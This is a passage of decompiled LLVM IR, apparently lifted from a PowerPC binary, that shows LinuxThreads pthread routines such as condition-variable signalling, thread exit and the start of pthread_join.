  %v1_10006bcc = add i32 %arg2, 8
  %v2_10006bcc = inttoptr i32 %v1_10006bcc to i32*
  %v3_10006bcc = load i32, i32* %v2_10006bcc, align 4
  %v4_10006bd0 = icmp eq i32 %v3_10006bcc, %v0_10006bb0
  br i1 %v4_10006bd0, label %dec_label_pc_10006bd8, label %dec_label_pc_10006d14

dec_label_pc_10006bd8:                            ; preds = %dec_label_pc_10006bc4, %dec_label_pc_10006bbc, %entry
  store i32 %v0_10006bb0, i32* @r11, align 4
  %v2_10006bec = ptrtoint i32* %stack_var_-36 to i32
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v3_10006bf4 = add i32 %v0_10006bb0, 441
  %v4_10006bf4 = inttoptr i32 %v3_10006bf4 to i8*
  store i8 0, i8* %v4_10006bf4, align 1
  store i32 268463104, i32* @lr, align 4
  %v2_10006bfc = call i32 @__pthread_set_own_extricate_if(i32 %v0_10006bb0, i32 %v2_10006bec)
  %v0_10006c00 = load i32, i32* @r31, align 4
  store i32 %v0_10006c00, i32* @r3, align 4
  store i32 %v0_10006bb0, i32* @r4, align 4
  store i32 268463116, i32* @lr, align 4
  %v0_10006c08 = call i32 @__pthread_lock()
  store i32 %v0_10006bb0, i32* @r9, align 4
  %v1_10006c10 = add i32 %v0_10006bb0, 66
  %v2_10006c10 = inttoptr i32 %v1_10006c10 to i8*
  %v3_10006c10 = load i8, i8* %v2_10006c10, align 1
  %v3_10006c14 = icmp eq i8 %v3_10006c10, 0
  br i1 %v3_10006c14, label %dec_label_pc_10006c30, label %dec_label_pc_10006c1c

dec_label_pc_10006c1c:                            ; preds = %dec_label_pc_10006bd8
  store i32 %v0_10006bb0, i32* @r9, align 4
  store i32 1, i32* %r30.global-to-local, align 4
  %v1_10006c24 = add i32 %v0_10006bb0, 64
  %v2_10006c24 = inttoptr i32 %v1_10006c24 to i8*
  %v3_10006c24 = load i8, i8* %v2_10006c24, align 1
  %v3_10006c28 = icmp eq i8 %v3_10006c24, 0
  br i1 %v3_10006c28, label %dec_label_pc_10006c40, label %dec_label_pc_10006c30

dec_label_pc_10006c30:                            ; preds = %dec_label_pc_10006c1c, %dec_label_pc_10006bd8
  %v0_10006c34 = load i32, i32* @r31, align 4
  %v1_10006c34 = add i32 %v0_10006c34, 8
  store i32 0, i32* %r30.global-to-local, align 4
  %v2_10006c3c = call i32 @enqueue(i32 %v1_10006c34, i32 %v0_10006bb0)
  br label %dec_label_pc_10006c40

dec_label_pc_10006c40:                            ; preds = %dec_label_pc_10006c1c, %dec_label_pc_10006c30
  %v0_10006c40 = load i32, i32* @r31, align 4
  store i32 %v0_10006c40, i32* @r3, align 4
  store i32 268463176, i32* @lr, align 4
  %v0_10006c44 = call i32 @__pthread_unlock()
  %v0_10006c48 = load i32, i32* %r30.global-to-local, align 4
  %v3_10006c48 = icmp eq i32 %v0_10006c48, 0
  br i1 %v3_10006c48, label %dec_label_pc_10006c60, label %dec_label_pc_10006c50

dec_label_pc_10006c50:                            ; preds = %dec_label_pc_10006c40
  store i32 ptrtoint (i32* @global_var_10006c5c.280 to i32), i32* @lr, align 4
  %v2_10006c58 = call i32 @__pthread_set_own_extricate_if(i32 %v0_10006bb0, i32 0)
  br label %dec_label_pc_10006ce8

dec_label_pc_10006c60:                            ; preds = %dec_label_pc_10006c40
  %v0_10006c60 = load i32, i32* @r29, align 4
  store i32 %v0_10006c60, i32* @r3, align 4
  store i32 268463212, i32* @lr, align 4
  %v0_10006c68 = call i32 @pthread_mutex_unlock()
  %v1_10006c88 = add i32 %v0_10006bb0, 440
  %v2_10006c88 = inttoptr i32 %v1_10006c88 to i8*
  %v1_10006c98 = add i32 %v0_10006bb0, 64
  %v2_10006c98 = inttoptr i32 %v1_10006c98 to i8*
  store i32 %v0_10006bb0, i32* @r3, align 4
  store i32 268463220, i32* @lr, align 4
  %v1_10006c707 = call i32 @suspend.1(i32 %v0_10006bb0)
  %v3_10006c788 = load i8, i8* %v4_10006bf4, align 1
  %v3_10006c7c11 = icmp eq i8 %v3_10006c788, 0
  br i1 %v3_10006c7c11, label %dec_label_pc_10006c84, label %dec_label_pc_10006cac

dec_label_pc_10006c84:                            ; preds = %dec_label_pc_10006c60, %dec_label_pc_10006ca4
  %v3_10006c88 = load i8, i8* %v2_10006c88, align 1
  %v3_10006c8c = icmp eq i8 %v3_10006c88, 0
  br i1 %v3_10006c8c, label %dec_label_pc_10006ca4, label %dec_label_pc_10006c94

dec_label_pc_10006c94:                            ; preds = %dec_label_pc_10006c84
  %v3_10006c98 = load i8, i8* %v2_10006c98, align 1
  %v3_10006c9c = icmp eq i8 %v3_10006c98, 0
  br i1 %v3_10006c9c, label %dec_label_pc_10006cac, label %dec_label_pc_10006ca4

dec_label_pc_10006ca4:                            ; preds = %dec_label_pc_10006c94, %dec_label_pc_10006c84
  store i32 %v0_10006bb0, i32* @r3, align 4
  store i32 268463220, i32* @lr, align 4
  %v1_10006c70 = call i32 @suspend.1(i32 %v0_10006bb0)
  %v3_10006c78 = load i8, i8* %v4_10006bf4, align 1
  %v3_10006c7c = icmp eq i8 %v3_10006c78, 0
  br i1 %v3_10006c7c, label %dec_label_pc_10006c84, label %dec_label_pc_10006cac

dec_label_pc_10006cac:                            ; preds = %dec_label_pc_10006c94, %dec_label_pc_10006ca4, %dec_label_pc_10006c60
  store i32 268463288, i32* @lr, align 4
  %v2_10006cb4 = call i32 @__pthread_set_own_extricate_if(i32 %v0_10006bb0, i32 0)
  %v3_10006cbc = load i8, i8* %v2_10006c88, align 1
  %v3_10006cc0 = icmp eq i8 %v3_10006cbc, 0
  br i1 %v3_10006cc0, label %dec_label_pc_10006cfc, label %dec_label_pc_10006cc8

dec_label_pc_10006cc8:                            ; preds = %dec_label_pc_10006cac
  %v3_10006ccc = load i8, i8* %v2_10006c98, align 1
  %v3_10006cd0 = icmp eq i8 %v3_10006ccc, 0
  br i1 %v3_10006cd0, label %dec_label_pc_10006cd8, label %dec_label_pc_10006cfc

dec_label_pc_10006cd8:                            ; preds = %dec_label_pc_10006cc8
  %v0_10006cdc = load i32, i32* @r29, align 4
  store i8 0, i8* %v2_10006c88, align 1
  store i32 268463336, i32* @lr, align 4
  %v1_10006ce4 = call i32 @pthread_mutex_lock(i32 %v0_10006cdc)
  br label %dec_label_pc_10006ce8

dec_label_pc_10006ce8:                            ; preds = %dec_label_pc_10006c50, %dec_label_pc_10006cd8
  %v0_10006cf0 = call i32 @__pthread_do_exit()
  br label %dec_label_pc_10006cf4

dec_label_pc_10006cf4:                            ; preds = %dec_label_pc_10006cfc, %dec_label_pc_10006ce8
  store i32 %v0_10006bb0, i32* @r3, align 4
  store i32 268463356, i32* @lr, align 4
  %v1_10006cf8 = call i32 @restart(i32 %v0_10006bb0)
  br label %dec_label_pc_10006cfc

dec_label_pc_10006cfc:                            ; preds = %dec_label_pc_10006cc8, %dec_label_pc_10006cac, %dec_label_pc_10006cf4
  %v0_10006cfc = load i32, i32* @r31, align 4
  %v3_10006cfc = icmp eq i32 %v0_10006cfc, 0
  %v1_10006d00 = add i32 %v0_10006cfc, -1
  store i32 %v1_10006d00, i32* @r31, align 4
  br i1 %v3_10006cfc, label %dec_label_pc_10006d08, label %dec_label_pc_10006cf4

dec_label_pc_10006d08:                            ; preds = %dec_label_pc_10006cfc
  %v0_10006d08 = load i32, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006d10.281 to i32), i32* @lr, align 4
  %v1_10006d0c = call i32 @pthread_mutex_lock(i32 %v0_10006d08)
  br label %dec_label_pc_10006d14

dec_label_pc_10006d14:                            ; preds = %dec_label_pc_10006bc4, %dec_label_pc_10006d08
  %v0_10006d24 = phi i32 [ 22, %dec_label_pc_10006bc4 ], [ 0, %dec_label_pc_10006d08 ]
  ret i32 %v0_10006d24

; uselistorder directives
  uselistorder i8* %v2_10006c88, { 1, 0, 2 }
  uselistorder i8* %v4_10006bf4, { 1, 0, 2 }
  uselistorder i32 %v0_10006bb0, { 8, 7, 9, 13, 12, 0, 1, 10, 11, 6, 14, 5, 4, 17, 16, 15, 18, 2, 19, 3 }
  uselistorder i32* %r30.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i32)* @suspend.1, { 1, 0, 2 }
  uselistorder i32 268463220, { 1, 0 }
  uselistorder i32 (i32, i32)* @__pthread_set_own_extricate_if, { 2, 1, 0, 6, 5, 4, 3 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10006d14, { 1, 0 }
  uselistorder label %dec_label_pc_10006cfc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10006ce8, { 1, 0 }
  uselistorder label %dec_label_pc_10006cac, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10006c84, { 1, 0 }
  uselistorder label %dec_label_pc_10006c40, { 1, 0 }
}

define i32 @cond_extricate_func(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_10006d30 = load i32, i32* @r2, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %v0_10006d30, i32* @r4, align 4
  store i32 %arg1, i32* %r28.global-to-local, align 4
  store i32 268463436, i32* @lr, align 4
  %v0_10006d48 = call i32 @__pthread_lock()
  %v0_10006d4c = load i32, i32* @r29, align 4
  %v1_10006d50 = add i32 %arg1, 8
  store i32 %v1_10006d50, i32* @r3, align 4
  %v2_10006d54 = call i32 @remove_from_queue(i32 %v1_10006d50, i32 %v0_10006d4c)
  %v0_10006d5c = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10006d5c, i32* @r3, align 4
  store i32 268463460, i32* @lr, align 4
  %v0_10006d60 = call i32 @__pthread_unlock()
  ret i32 %v2_10006d54

; uselistorder directives
  uselistorder i32 (i32, i32)* @remove_from_queue, { 1, 0 }
}

define i32 @pthread_cond_signal(i32 %arg1) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %v0_10006d84 = call i32 @__asm_mfcr()
  store i32 %v0_10006d84, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 268463520, i32* @lr, align 4
  %v0_10006d9c = call i32 @__pthread_lock()
  %v0_10006da0 = load i32, i32* @r30, align 4
  %v1_10006da0 = add i32 %v0_10006da0, 8
  %v2_10006da0 = inttoptr i32 %v1_10006da0 to i32*
  %v3_10006da0 = load i32, i32* %v2_10006da0, align 4
  store i32 %v3_10006da0, i32* @r31, align 4
  store i32 %v0_10006da0, i32* @r3, align 4
  %v3_10006da8 = icmp eq i32 %v3_10006da0, 0
  store i1 %v3_10006da8, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_10006da8, label %dec_label_pc_10006dc0, label %dec_label_pc_10006db0

dec_label_pc_10006db0:                            ; preds = %entry
  %v1_10006db0 = add i32 %v3_10006da0, 8
  %v2_10006db0 = inttoptr i32 %v1_10006db0 to i32*
  %v3_10006db0 = load i32, i32* %v2_10006db0, align 4
  store i32 %v3_10006db0, i32* %v2_10006da0, align 4
  %v1_10006dbc = load i32, i32* @r31, align 4
  %v2_10006dbc = add i32 %v1_10006dbc, 8
  %v3_10006dbc = inttoptr i32 %v2_10006dbc to i32*
  store i32 0, i32* %v3_10006dbc, align 4
  br label %dec_label_pc_10006dc0

dec_label_pc_10006dc0:                            ; preds = %entry, %dec_label_pc_10006db0
  store i32 268463556, i32* @lr, align 4
  %v0_10006dc0 = call i32 @__pthread_unlock()
  %v0_10006dc4 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10006dc4, label %dec_label_pc_10006ddc, label %dec_label_pc_10006dc8

dec_label_pc_10006dc8:                            ; preds = %dec_label_pc_10006dc0
  %v2_10006dcc = load i32, i32* @r31, align 4
  %v3_10006dcc = add i32 %v2_10006dcc, 441
  %v4_10006dcc = inttoptr i32 %v3_10006dcc to i8*
  store i8 1, i8* %v4_10006dcc, align 1
  %v0_10006dd4 = load i32, i32* @r31, align 4
  store i32 %v0_10006dd4, i32* @r3, align 4
  store i32 268463580, i32* @lr, align 4
  %v1_10006dd8 = call i32 @restart(i32 %v0_10006dd4)
  br label %dec_label_pc_10006ddc

dec_label_pc_10006ddc:                            ; preds = %dec_label_pc_10006dc0, %dec_label_pc_10006dc8
  %v1_10006df0 = call %0 @__asm_mtcrf(i32 8, i32 %v0_10006d84)
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32)* @restart, { 3, 0, 2, 1 }
  uselistorder i32 441, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_10006ddc, { 1, 0 }
  uselistorder label %dec_label_pc_10006dc0, { 1, 0 }
}

define i32 @__linuxthreads_create_event(i32 %arg1) local_unnamed_addr {
entry:
  %v0_10006dfc = load i32, i32* @r3, align 4
  ret i32 %v0_10006dfc
}

define i32 @__linuxthreads_death_event(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_10006e00 = load i32, i32* @r3, align 4
  ret i32 %v0_10006e00
}

define i32 @__linuxthreads_reap_event(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_10006e04 = load i32, i32* @r3, align 4
  ret i32 %v0_10006e04
}

define i32 @__pthread_set_own_extricate_if.2(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v0_10006e08 = call i32 @__asm_mfcr()
  store i32 %v0_10006e08, i32* %r3.global-to-local, align 4
  %v3_10006e0c = icmp eq i32 %arg2, 0
  store i1 %v3_10006e0c, i1* %cr4_eq.global-to-local, align 1
  store i32 %arg2, i32* @r30, align 4
  store i32 %v0_10006e08, i32* @r31, align 4
  store i32 %v0_10006e08, i32* @r4, align 4
  br i1 %v3_10006e0c, label %dec_label_pc_10006e4c, label %dec_label_pc_10006e34

dec_label_pc_10006e34:                            ; preds = %entry
  %v1_10006e34 = add i32 %v0_10006e08, 64
  %v2_10006e34 = inttoptr i32 %v1_10006e34 to i8*
  %v3_10006e34 = load i8, i8* %v2_10006e34, align 1
  %v3_10006e38 = icmp eq i8 %v3_10006e34, 0
  br i1 %v3_10006e38, label %dec_label_pc_10006e4c.thread, label %dec_label_pc_10006e5c

dec_label_pc_10006e4c.thread:                     ; preds = %dec_label_pc_10006e34
  %v2_10006e4c4 = add i32 %v0_10006e08, 444
  %v3_10006e4c5 = inttoptr i32 %v2_10006e4c4 to i32*
  store i32 %arg2, i32* %v3_10006e4c5, align 4
  br label %dec_label_pc_10006e5c

dec_label_pc_10006e4c:                            ; preds = %entry
  %v1_10006e44 = add i32 %v0_10006e08, 28
  %v2_10006e44 = inttoptr i32 %v1_10006e44 to i32*
  %v3_10006e44 = load i32, i32* %v2_10006e44, align 4
  store i32 %v3_10006e44, i32* @r3, align 4
  store i32 268463692, i32* @lr, align 4
  %v0_10006e48 = call i32 @__pthread_lock()
  store i32 %v0_10006e48, i32* %r3.global-to-local, align 4
  %v0_10006e4c.pre = load i32, i32* @r30, align 4
  %v1_10006e4c.pre = load i32, i32* @r31, align 4
  %v0_10006e50.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  %v2_10006e4c = add i32 %v1_10006e4c.pre, 444
  %v3_10006e4c = inttoptr i32 %v2_10006e4c to i32*
  store i32 %v0_10006e4c.pre, i32* %v3_10006e4c, align 4
  br i1 %v0_10006e50.pre, label %dec_label_pc_10006e54, label %dec_label_pc_10006e5c

dec_label_pc_10006e54:                            ; preds = %dec_label_pc_10006e4c
  %v0_10006e54 = load i32, i32* @r31, align 4
  %v1_10006e54 = add i32 %v0_10006e54, 28
  %v2_10006e54 = inttoptr i32 %v1_10006e54 to i32*
  %v3_10006e54 = load i32, i32* %v2_10006e54, align 4
  store i32 %v3_10006e54, i32* @r3, align 4
  store i32 268463708, i32* @lr, align 4
  %v0_10006e58 = call i32 @__pthread_unlock()
  store i32 %v0_10006e58, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006e5c

dec_label_pc_10006e5c:                            ; preds = %dec_label_pc_10006e4c.thread, %dec_label_pc_10006e4c, %dec_label_pc_10006e34, %dec_label_pc_10006e54
  %v1_10006e6c = call %0 @__asm_mtcrf(i32 8, i32 %v0_10006e08)
  %v0_10006e74 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10006e74

; uselistorder directives
  uselistorder i32 %v0_10006e08, { 5, 4, 0, 3, 2, 1, 6 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 2, 0, 1 }
  uselistorder label %dec_label_pc_10006e5c, { 3, 1, 0, 2 }
}

define i32 @suspend.3(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268463752, i32* @lr, align 4
  %v0_10006e84 = call i32 @__pthread_wait_for_restart_signal()
  ret i32 %v0_10006e84
}

define i32 @__pthread_do_exit() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %v0_10006ea4 = load i32, i32* @r3, align 4
  store i32 %v0_10006ea4, i32* %r29.global-to-local, align 4
  %v2_10006eb0 = load i32, i32* @r2, align 4
  %v3_10006eb0 = add i32 %v2_10006eb0, 64
  %v4_10006eb0 = inttoptr i32 %v3_10006eb0 to i8*
  store i8 1, i8* %v4_10006eb0, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10006eb8 = load i32, i32* @r2, align 4
  %v3_10006eb8 = add i32 %v2_10006eb8, 65
  %v4_10006eb8 = inttoptr i32 %v3_10006eb8 to i8*
  store i8 0, i8* %v4_10006eb8, align 1
  %v0_10006ebc = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_10006ec8.282 to i32), i32* @lr, align 4
  %v1_10006ec4 = call i32 @__pthread_perform_cleanup(i32 %v0_10006ebc)
  store i32 268463820, i32* @lr, align 4
  %v1_10006ec8 = call i32 @__pthread_destroy_specifics(i32 %v1_10006ec4)
  %v0_10006ecc = load i32, i32* @r31, align 4
  %v1_10006ecc = add i32 %v0_10006ecc, 28
  %v2_10006ecc = inttoptr i32 %v1_10006ecc to i32*
  %v3_10006ecc = load i32, i32* %v2_10006ecc, align 4
  store i32 %v3_10006ecc, i32* @r3, align 4
  store i32 %v0_10006ecc, i32* @r4, align 4
  store i32 268463832, i32* @lr, align 4
  %v0_10006ed4 = call i32 @__pthread_lock()
  store i32 %v0_10006ed4, i32* @r3, align 4
  %v0_10006ed8 = load i32, i32* @r31, align 4
  %v1_10006ed8 = add i32 %v0_10006ed8, 412
  %v2_10006ed8 = inttoptr i32 %v1_10006ed8 to i32*
  %v3_10006ed8 = load i32, i32* %v2_10006ed8, align 4
  store i32 %v3_10006ed8, i32* %r0.global-to-local, align 4
  %v0_10006edc = load i32, i32* @r29, align 4
  %v2_10006edc = add i32 %v0_10006ed8, 48
  %v3_10006edc = inttoptr i32 %v2_10006edc to i32*
  store i32 %v0_10006edc, i32* %v3_10006edc, align 4
  %v0_10006ee0 = load i32, i32* %r0.global-to-local, align 4
  %v3_10006ee0 = icmp eq i32 %v0_10006ee0, 0
  br i1 %v3_10006ee0, label %dec_label_pc_10006f18, label %dec_label_pc_10006ee8

dec_label_pc_10006ee8:                            ; preds = %entry
  %v3_10006eec = load i32, i32* @global_var_1002f030.246, align 4
  store i32 %v3_10006eec, i32* %r0.global-to-local, align 4
  %v0_10006ef0 = load i32, i32* @r31, align 4
  %v1_10006ef0 = add i32 %v0_10006ef0, 416
  %v2_10006ef0 = inttoptr i32 %v1_10006ef0 to i32*
  %v3_10006ef0 = load i32, i32* %v2_10006ef0, align 4
  %v2_10006ef4 = or i32 %v3_10006ef0, %v3_10006eec
  store i32 %v2_10006ef4, i32* %r0.global-to-local, align 4
  %v1_10006ef8 = and i32 %v2_10006ef4, 256
  %v3_10006ef8 = icmp eq i32 %v1_10006ef8, 0
  br i1 %v3_10006ef8, label %dec_label_pc_10006f18, label %dec_label_pc_10006f00

dec_label_pc_10006f00:                            ; preds = %dec_label_pc_10006ee8
  store i32 9, i32* %r0.global-to-local, align 4
  %v2_10006f04 = add i32 %v0_10006ef0, 428
  %v3_10006f04 = inttoptr i32 %v2_10006f04 to i32*
  store i32 %v0_10006ef0, i32* %v3_10006f04, align 4
  %v0_10006f08 = load i32, i32* %r0.global-to-local, align 4
  %v1_10006f08 = load i32, i32* @r31, align 4
  %v2_10006f08 = add i32 %v1_10006f08, 424
  %v3_10006f08 = inttoptr i32 %v2_10006f08 to i32*
  store i32 %v0_10006f08, i32* %v3_10006f08, align 4
  %v0_10006f10 = load i32, i32* @r31, align 4
  store i32 %v0_10006f10, i32* @global_var_1002f038.254, align 4
  %v2_10006f14 = call i32 @__linuxthreads_death_event(i32 %v0_10006ed4, i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  br label %dec_label_pc_10006f18

dec_label_pc_10006f18:                            ; preds = %dec_label_pc_10006ee8, %entry, %dec_label_pc_10006f00
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10006f1c = load i32, i32* @r31, align 4
  %v1_10006f1c = add i32 %v0_10006f1c, 56
  %v2_10006f1c = inttoptr i32 %v1_10006f1c to i32*
  %v3_10006f1c = load i32, i32* %v2_10006f1c, align 4
  store i32 %v3_10006f1c, i32* %r29.global-to-local, align 4
  %v3_10006f20 = add i32 %v0_10006f1c, 44
  %v4_10006f20 = inttoptr i32 %v3_10006f20 to i8*
  store i8 1, i8* %v4_10006f20, align 1
  %v0_10006f24 = load i32, i32* @r31, align 4
  %v1_10006f24 = add i32 %v0_10006f24, 28
  %v2_10006f24 = inttoptr i32 %v1_10006f24 to i32*
  %v3_10006f24 = load i32, i32* %v2_10006f24, align 4
  store i32 %v3_10006f24, i32* @r3, align 4
  store i32 268463916, i32* @lr, align 4
  %v0_10006f28 = call i32 @__pthread_unlock()
  %v0_10006f2c = load i32, i32* %r29.global-to-local, align 4
  %v3_10006f2c = icmp eq i32 %v0_10006f2c, 0
  br i1 %v3_10006f2c, label %dec_label_pc_10006f3c, label %dec_label_pc_10006f34

dec_label_pc_10006f34:                            ; preds = %dec_label_pc_10006f18
  store i32 %v0_10006f2c, i32* @r3, align 4
  store i32 268463932, i32* @lr, align 4
  %v0_10006f38 = call i32 @__pthread_restart_new()
  br label %dec_label_pc_10006f3c

dec_label_pc_10006f3c:                            ; preds = %dec_label_pc_10006f18, %dec_label_pc_10006f34
  %v3_10006f40 = load i32, i32* @global_var_1002ef30, align 4
  store i32 %v3_10006f40, i32* %r29.global-to-local, align 4
  %v0_10006f44 = load i32, i32* @r31, align 4
  %v4_10006f44 = icmp eq i32 %v0_10006f44, %v3_10006f40
  br i1 %v4_10006f44, label %dec_label_pc_10006f4c, label %dec_label_pc_10006fa4

dec_label_pc_10006f4c:                            ; preds = %dec_label_pc_10006f3c
  %v3_10006f50 = load i32, i32* @global_var_1002ef34.220, align 4
  store i32 %v3_10006f50, i32* %r0.global-to-local, align 4
  %v1_10006f54 = icmp slt i32 %v3_10006f50, 0
  br i1 %v1_10006f54, label %dec_label_pc_10006fa4, label %dec_label_pc_10006f5c

dec_label_pc_10006f5c:                            ; preds = %dec_label_pc_10006f4c
  store i32 3, i32* %r0.global-to-local, align 4
  store i32 %v3_10006f40, i32* %stack_var_-184, align 4
  %v2_10006f6c = ptrtoint i32* %stack_var_-184 to i32
  store i32 268463996, i32* @lr, align 4
  %v2_10006f786 = call i32 @__libc_write(i32 %v3_10006f50, i32 %v2_10006f6c)
  %v3_10006f7c9 = icmp eq i32 %v2_10006f786, -1
  br i1 %v3_10006f7c9, label %dec_label_pc_10006f84, label %dec_label_pc_10006f94

dec_label_pc_10006f84:                            ; preds = %dec_label_pc_10006f5c, %dec_label_pc_10006f84.dec_label_pc_10006f68_crit_edge
  %v0_10006f84 = call i32 @__errno_location()
  %v1_10006f88 = inttoptr i32 %v0_10006f84 to i32*
  %v2_10006f88 = load i32, i32* %v1_10006f88, align 4
  store i32 %v2_10006f88, i32* %r0.global-to-local, align 4
  %v3_10006f8c = icmp eq i32 %v2_10006f88, 4
  br i1 %v3_10006f8c, label %dec_label_pc_10006f84.dec_label_pc_10006f68_crit_edge, label %dec_label_pc_10006f94

dec_label_pc_10006f84.dec_label_pc_10006f68_crit_edge: ; preds = %dec_label_pc_10006f84
  %v3_10006f70.pre = load i32, i32* @global_var_1002ef34.220, align 4
  store i32 268463996, i32* @lr, align 4
  %v2_10006f78 = call i32 @__libc_write(i32 %v3_10006f70.pre, i32 %v2_10006f6c)
  %v3_10006f7c = icmp eq i32 %v2_10006f78, -1
  br i1 %v3_10006f7c, label %dec_label_pc_10006f84, label %dec_label_pc_10006f94

dec_label_pc_10006f94:                            ; preds = %dec_label_pc_10006f84, %dec_label_pc_10006f84.dec_label_pc_10006f68_crit_edge, %dec_label_pc_10006f5c
  %v0_10006f94 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10006f94, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006f9c.284 to i32), i32* @lr, align 4
  %v1_10006f98 = call i32 @suspend.3(i32 %v0_10006f94)
  %v0_10006fa0 = call i32 @__GI_exit()
  br label %dec_label_pc_10006fa4

dec_label_pc_10006fa4:                            ; preds = %dec_label_pc_10006f3c, %dec_label_pc_10006f4c, %dec_label_pc_10006f94
  %v1_10006fa8 = call i32 @__GI__exit(i32 0)
  ret i32 %v1_10006fa8

; uselistorder directives
  uselistorder i32 %v2_10006f6c, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 6, 7, 4, 5, 8, 9, 10 }
  uselistorder i32 268463996, { 1, 0 }
  uselistorder label %dec_label_pc_10006fa4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10006f94, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10006f84, { 1, 0 }
  uselistorder label %dec_label_pc_10006f3c, { 1, 0 }
  uselistorder label %dec_label_pc_10006f18, { 2, 0, 1 }
}

define i32 @pthread_join(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %v0_10006fb8 = load i32, i32* @r2, align 4
  %v1_10006fc4 = call i32 @__asm_rlwinm(i32 %arg1, i32 4, i32 18, i32 27)
  %v2_10006fd0 = add i32 %v1_10006fc4, ptrtoint (i32* @global_var_1002abe0.262 to i32)
  store i32 %arg1, i32* %r28.global-to-local, align 4
  store i32 %tmp, i32* %r27.global-to-local, align 4
  store i32 %v2_10006fd0, i32* @r3, align 4
  store i32 %v0_10006fb8, i32* @r4, align 4
  store i32 %v2_10006fd0, i32* %stack_var_-180, align 4
  store i32 268464120, i32* @lr, align 4
  %v0_10006ff4 = call i32 @__pthread_lock()
  %v0_10006ff8 = load i32, i32* @r30, align 4
  %v1_10006ff8 = add i32 %v0_10006ff8, 8
  %v2_10006ff8 = inttoptr i32 %v1_10006ff8 to i32*
  %v3_10006ff8 = load i32, i32* %v2_10006ff8, align 4
  store i32 %v3_10006ff8, i32* @r31, align 4
  %v3_10006ffc = icmp eq i32 %v3_10006ff8, 0
  br i1 %v3_10006ffc, label %dec_label_pc_10007010, label %dec_label_pc_10007004

dec_label_pc_10007004:                            ; preds = %entry
  %v1_10007004 = add i32 %v3_10006ff8, 16
  %v2_10007004 = inttoptr i32 %v1_10007004 to i32*
  %v3_10007004 = load i32, i32* %v2_10007004, align 4
  %v0_10007008 = load i32, i32* %r28.global-to-local, align 4
  %v4_10007008 = icmp eq i32 %v0_10007008, %v3_10007004
  br i1 %v4_10007008, label %dec_label_pc_10007020, label %dec_label_pc_10007010

dec_label_pc_10007010:                            ; preds = %dec_label_pc_10007004, %entry
  store i32 %v0_10006ff8, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10007018.286 to i32), i32* @lr, align 4
  %v0_10007014 = call i32 @__pthread_unlock()
  br label %dec_label_pc_10007194

dec_label_pc_10007020:                            ; preds = %dec_label_pc_10007004
  %v4_10007024 = icmp eq i32 %v3_10006ff8, %v0_10006fb8
  br i1 %v4_10007024, label %dec_label_pc_1000702c, label %dec_label_pc_1000703c

dec_label_pc_1000702c:                            ; preds = %dec_label_pc_10007020
  store i32 %v0_10006ff8, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10007034.287 to i32), i32* @lr, align 4
  %v0_10007030 = call i32 @__pthread_unlock()
  br label %dec_label_pc_10007194

dec_label_pc_1000703c:                            ; preds = %dec_label_pc_10007020
  %v1_1000703c = add i32 %v3_10006ff8, 45
  %v2_1000703c = inttoptr i32 %v1_1000703c to i8*
  %v3_1000703c = load i8, i8* %v2_1000703c, align 1
  %v3_10007040 = icmp eq i8 %v3_1000703c, 0
  br i1 %v3_10007040, label %dec_label_pc_10007048, label %dec_label_pc_10007054

dec_label_pc_10007048:                            ; preds = %dec_label_pc_1000703c
  %v1_10007048 = add i32 %v3_10006ff8, 56
  %v2_10007048 = inttoptr i32 %v1_10007048 to i32*
  %v3_10007048 = load i32, i32* %v2_10007048, align 4
  %v3_1000704c = icmp eq i32 %v3_10007048, 0
  br i1 %v3_1000704c, label %dec_label_pc_10007064, label %dec_label_pc_10007054

dec_label_pc_10007054:                            ; preds = %dec_label_pc_1000703c, %dec_label_pc_10007048
  store i32 %v0_10006ff8, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000705c.288 to i32), i32* @lr, align 4
  %v0_10007058 = call i32 @__pthread_unlock()
